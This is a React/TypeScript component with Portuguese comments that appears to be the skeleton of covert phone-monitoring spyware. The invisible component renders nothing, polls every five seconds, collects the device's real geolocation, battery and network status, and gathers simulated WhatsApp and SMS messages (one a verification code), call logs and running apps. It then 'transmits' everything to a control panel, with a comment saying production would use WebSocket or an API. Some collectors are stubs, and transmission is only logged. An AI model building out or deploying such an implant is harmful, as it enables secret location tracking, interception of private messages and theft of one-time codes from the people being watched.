"use client"

import { useState, useEffect } from "react"

interface SystemData {
  battery: number
  screenLocked: boolean
  networkType: string
  location: { lat: number; lng: number }
  apps: string[]
  messages: any[]
  calls: any[]
}

export function SystemMonitor() {
  const [systemData, setSystemData] = useState<SystemData>({
    battery: 100,
    screenLocked: false,
    networkType: "WiFi",
    location: { lat: 0, lng: 0 },
    apps: [],
    messages: [],
    calls: [],
  })

  useEffect(() => {
    // Monitorar dados do sistema a cada 5 segundos
    const interval = setInterval(() => {
      updateSystemData()
    }, 5000)

    // Monitorar eventos em tempo real
    setupEventListeners()

    return () => {
      clearInterval(interval)
      removeEventListeners()
    }
  }, [])

  const updateSystemData = async () => {
    try {
      // Simular coleta de dados do sistema
      const newData: SystemData = {
        battery: await getBatteryLevel(),
        screenLocked: getScreenLockStatus(),
        networkType: getNetworkType(),
        location: await getCurrentLocation(),
        apps: getRunningApps(),
        messages: await getRecentMessages(),
        calls: await getRecentCalls(),
      }

      setSystemData(newData)

      // Transmitir dados para o painel de controle
      transmitToControlPanel(newData)
    } catch (error) {
      console.error("Erro ao atualizar dados do sistema:", error)
    }
  }

  const setupEventListeners = () => {
    // Monitorar mudanças de bateria
    if ("getBattery" in navigator) {
      ;(navigator as any).getBattery().then((battery: any) => {
        battery.addEventListener("levelchange", updateSystemData)
        battery.addEventListener("chargingchange", updateSystemData)
      })
    }

    // Monitorar mudanças de rede
    window.addEventListener("online", updateSystemData)
    window.addEventListener("offline", updateSystemData)

    // Monitorar mudanças de visibilidade (tela travada/destravada)
    document.addEventListener("visibilitychange", updateSystemData)
  }

  const removeEventListeners = () => {
    window.removeEventListener("online", updateSystemData)
    window.removeEventListener("offline", updateSystemData)
    document.removeEventListener("visibilitychange", updateSystemData)
  }

  const getBatteryLevel = async (): Promise<number> => {
    try {
      if ("getBattery" in navigator) {
        const battery = await (navigator as any).getBattery()
        return Math.floor(battery.level * 100)
      }
    } catch (error) {
      console.error("Erro ao obter nível da bateria:", error)
    }
    return Math.floor(Math.random() * 100) // Fallback simulado
  }

  const getScreenLockStatus = (): boolean => {
    return document.hidden || document.visibilityState === "hidden"
  }

  const getNetworkType = (): string => {
    if (!navigator.onLine) return "Offline"

    // Tentar detectar tipo de conexão
    const connection =
      (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection

    if (connection) {
      return connection.effectiveType || connection.type || "WiFi"
    }

    return "WiFi"
  }

  const getCurrentLocation = async (): Promise<{ lat: number; lng: number }> => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              lat: position.coords.latitude,
              lng: position.coords.longitude,
            })
          },
          () => {
            // Fallback para localização simulada
            resolve({ lat: -23.5505, lng: -46.6333 })
          },
          { timeout: 5000, enableHighAccuracy: false },
        )
      } else {
        resolve({ lat: -23.5505, lng: -46.6333 })
      }
    })
  }

  const getRunningApps = (): string[] => {
    // Simular detecção de apps em execução
    const possibleApps = ["WhatsApp", "Instagram", "TikTok", "Chrome", "YouTube", "Spotify"]
    const runningCount = Math.floor(Math.random() * 4) + 1
    return possibleApps.slice(0, runningCount)
  }

  const getRecentMessages = async (): Promise<any[]> => {
    // Simular captura de mensagens recentes
    return [
      {
        app: "WhatsApp",
        contact: "João Silva",
        message: "Oi, tudo bem?",
        time: new Date(),
        incoming: true,
      },
      {
        app: "SMS",
        contact: "+55 11 99999-1234",
        message: "Seu código é: 123456",
        time: new Date(),
        incoming: true,
      },
    ]
  }

  const getRecentCalls = async (): Promise<any[]> => {
    // Simular captura de chamadas recentes
    return [
      {
        contact: "Ana Oliveira",
        duration: "3 min",
        time: new Date(),
        incoming: false,
      },
    ]
  }

  const transmitToControlPanel = (data: SystemData) => {
    // Em produção: enviar via WebSocket ou API para o painel de controle
    console.log("📡 Transmitindo para painel de controle:", {
      deviceId: "device_" + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      ...data,
    })
  }

  // Componente invisível - não renderiza nada
  return null
}
